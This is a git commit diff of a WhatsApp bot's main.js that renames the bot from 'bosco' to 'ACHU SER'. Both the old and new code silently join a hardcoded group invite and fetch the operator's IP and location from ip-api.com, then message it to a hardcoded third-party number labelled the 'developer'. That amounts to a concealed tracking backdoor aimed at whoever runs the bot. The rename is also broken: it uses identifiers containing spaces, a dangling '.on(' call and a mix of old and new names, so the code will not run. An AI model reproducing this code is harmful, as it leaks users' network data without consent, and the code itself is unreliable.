15b06b50ab974dd5524ea7c2720138be6bfcc150
ACHUSER3 <96898066+ACHUSER3@users.noreply.github.com>
2022-01-02 22:23:55 +0530

    Update main.js

--- main.js
+++ main.js
@@ -42,58 +42,58 @@ baterai = 'unknown'
 charging = 'unknown'
 
 
-require('./Bosco.js')
-nocache('../Bosco.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
+require('./ACHU SER.js')
+nocache('../ACHU SER.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
 require('./message/help.js')
 nocache('../message/help.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
          
-    const starts = async (bosco = new WAConnection()) => {
-	bosco.logger.level = 'warn'
-	console.log(color(figlet.textSync('BOSCO BY PEPE', {
+    const starts = async (ACHU SER = new WAConnection()) => {
+	ACHU SER.logger.level = 'warn'
+	console.log(color(figlet.textSync('ACHU SER BY ACHU SER', {
 		font: 'Standard',
 		horizontalLayout: 'default',
 		vertivalLayout: 'default',
 		width: 80,
 		whitespaceBreak: false
 	}), 'yellow'))
-	console.log(color('[DENIS]', 'cyan'), color('WELCOME', 'white'))
+	console.log(color('[ACHU SER]', 'cyan'), color('WELCOME', 'white'))
 	console.log(color('[SER]', 'cyan'), color('BOT RUNNING', 'yellow'))
 	bosco.browserDescription = ["SUBSCRIBE YT - [PEPE - SIR]", "firefox", "3.0.0"];
 
 	// Menunggu QR
-	bosco.on('qr', () => {
+	ACHU SER.on('qr', () => {
 		console.log(color('[', 'white'), color('!', 'red'), color(']', 'white'), color('Please scan qr code'))
 	})
 
 	// Menghubungkan
-	fs.existsSync(`./Denis.json`) && bosco.loadAuthInfo(`./Denis.json`)
-	bosco.on('connecting', () => {
+	fs.existsSync(`./ACHU SER.json`) && ACHU SER.loadAuthInfo(`./ACHU SER.json`)
+	ACHU SER.on('connecting', () => {
 		start('2', 'Connecting...','red')
 	})
 
 	//connect
-	bosco.on('open', () => {
+	ACHU SER.on('open', () => {
 		success('2', 'Connected')
 	})
 
 	// session
-	await bosco.connect({
+	await ACHU SER.connect({
 		timeoutMs: 10 * 1000
 	})
-	fs.writeFileSync(`./Denis.json`, JSON.stringify(bosco.base64EncodedAuthInfo(), null, '\t'));
+	fs.writeFileSync(`./ACHU SER.json`, JSON.stringify(ACHU SER.base64EncodedAuthInfo(), null, '\t'));
  teks = `https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m`
- bosco.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ ACHU SER.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('ǫʀ ɪs ʀᴜɴɪɴɢ', 'blue'))
- bosco.sendMessage(`${setting.owner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 , 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(bosco.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 pepe ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
+ ACHU SER.sendMessage(`${setting.owner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 , 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(ACHU SER.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 pepe ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       bosco.sendMessage("17247805970@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer pepe ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
+       ACHU SER.sendMessage("17247805970@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer pepe ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
 
 	// Baterai
-	bosco.on('CB:action,,battery', json => {
+	ACHU SER.on('CB:action,,battery', json => {
 		global.batteryLevelStr = json[2][0][1].value
 		global.batterylevel = parseInt(batteryLevelStr)
 		baterai = batterylevel
@@ -103,27 +103,27 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 		console.log('Battery : ' + batterylevel + '%')
 	})
 	global.batrei = global.batrei ? global.batrei : []
-	bosco.on('CB:action,,battery', json => {
+	ACHU SER.on('CB:action,,battery', json => {
 		const batteryLevelStr = json[2][0][1].value
 		const batterylevel = parseInt(batteryLevelStr)
 		global.batrei.push(batterylevel)
 	})
 	
 	  // Call Block
-	/*bosco.on('CB:action,,call', async json => {
+	/*ACHU SER.on('CB:action,,call', async json => {
         const callerId = json[2][0][1].from;
         console.log("caller "+ callerId)
-        bosco.sendMessage(callerId, "Call = BLOCK!!\nDont call me!!", MessageType.text)
+        ACHU SER.sendMessage(callerId, "Call = BLOCK!!\nDont call me!!", MessageType.text)
         await sleep(3000)
-        await bosco.blockUser(callerId, "add") // Block user
+        await ACHU SER.blockUser(callerId, "add") // Block user
    })*/
    
-   bosco.on('message-delete', async (m) => {
+   ACHU SER.on('message-delete', async (m) => {
    	await m(m)
    })
   
        // welcome
-	bosco.on('group-participants-update', async (anu) => {
+	ACHU SER.on('group-participants-update', async (anu) => {
 		await welcome(bosco, anu)
 		try { 
            const mdata = await bosco.groupMetadata(anu.jid)
@@ -131,43 +131,43 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 		if (anu.action == 'promote'){
 			num = anu.participants[0]
 			try {
-					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
+					ppimg = await ACHU SER.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
 				} catch {
 					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
 				}
 			let buff = await getBuffer(ppimg)
-			const bosco1 = await bosco.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
-			const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
+			const bosco1 = await ACHU SER.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
+			const bosco2 = bosco1.message["ephemeralMessage"] ? ACHU SER1.message.ephemeralMessage : ACHU SER1
 			teks = `*Yᴏᴜ Aʀᴇ Nᴏᴡ Aɴ Aᴅᴍɪɴ*
  @${num.split('@')[0]}
 `
 			promoteBut = [{buttonId:`hm`,buttonText:{displayText:'Congrats 🥳'},type:1}]
             promoteButt = { contentText: `${teks}`, footerText: `Thank You So Much 🌝❤️`, buttons: promoteBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
-            bosco.sendMessage(mdata.id, promoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
+            ACHU SER.sendMessage(mdata.id, promoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
 		    } else if (anu.action == 'demote') {
 			num = anu.participants[0]
-			const mdata = await bosco.groupMetadata(anu.jid)
+			const mdata = await ACHU SER.groupMetadata(anu.jid)
 			try {
 					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
 				} catch {
 					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
 				}
 			let buff = await getBuffer(ppimg)
-			const bosco3= await bosco.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
-			const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
+			const ACHU SER3= await ACHU SER.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
+			const ACHU SER4 = ACHU SER3.message["ephemeralMessage"] ? ACHU SER3.message.ephemeralMessage : bosco3
 			teks = `*Yᴏᴜ Aʀᴇ Nᴏ Lᴏɴɢᴇʀ Aɴ Aᴅᴍɪɴ*
  @${num.split('@')[0]}
 `
 			demoteBut = [{buttonId:`hm`,buttonText:{displayText:'Next Time I get'},type:1}]
             demoteButt = { contentText: `${teks}`, footerText: `Who Is the Bledy Fool 🙂`, buttons: demoteBut, headerType: 6, locationMessage: bosco4.message.locationMessage}
-            bosco.sendMessage(mdata.id, demoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
+            ACHU SER.sendMessage(mdata.id, demoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
 		    }
             } catch (e) {
          console.log('Error : %s', color(e, 'red'))
       }
 })
 
-    bosco.on('group-update', async (anu) => {
+    ACHU SER.on('group-update', async (anu) => {
     falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
    remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "Alphabot", "caption": `🌹 𝑷 𝑬 𝑷 𝑬 - 𝑺 𝑬 𝑹 🌹`, 'jpegThumbnail': fs.readFileSync(`ds.jpg`)}}}
     metdata = await bosco.groupMetadata(anu.jid)
@@ -177,27 +177,27 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
     console.log(clc.yellow(`[ Group Opened ] In ${metdata.subject}`))
   } else if(anu.announce == 'true'){
     teks = `*[ Gʀᴏᴜᴘ Cʟᴏsᴇᴅ ]*\n`
-    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    ACHU SER.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
     console.log(clc.yellow(`[ Group Closed ] In ${metdata.subject}`))
   } else if(!anu.desc == ''){
     tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
     teks = `*[ Gʀᴏᴜᴘ Dɪsᴄʀɪᴘᴛɪᴏɴ Cʜᴀɴɢᴇ ]*\n\n • *ɴᴇᴡ* : *${anu.desc}*`
-    bosco.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
+    ACHU SER.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
     console.log(clc.yellow(`[ Group Description Change ] In ${metdata.subject}`))
  } else if(anu.restrict == 'false'){
     teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢs Cʜᴀɴɢᴇ ]*\n`
-    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    ACHU SER.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
     console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
   } else if(anu.restrict == 'true'){
     teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢ Cʜᴀɴɢᴇ ]*\n`
-    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    ACHU SER.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
     console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
    }
 })
 
     
-	bosco.on('chat-update', async (message) => {
-		require('./Bosco.js')(bosco, message)
+	.on('chat-update', async (message) => {
+		require('./ACHU SER.js')(ACHU SER, message)
 	})
 }
 
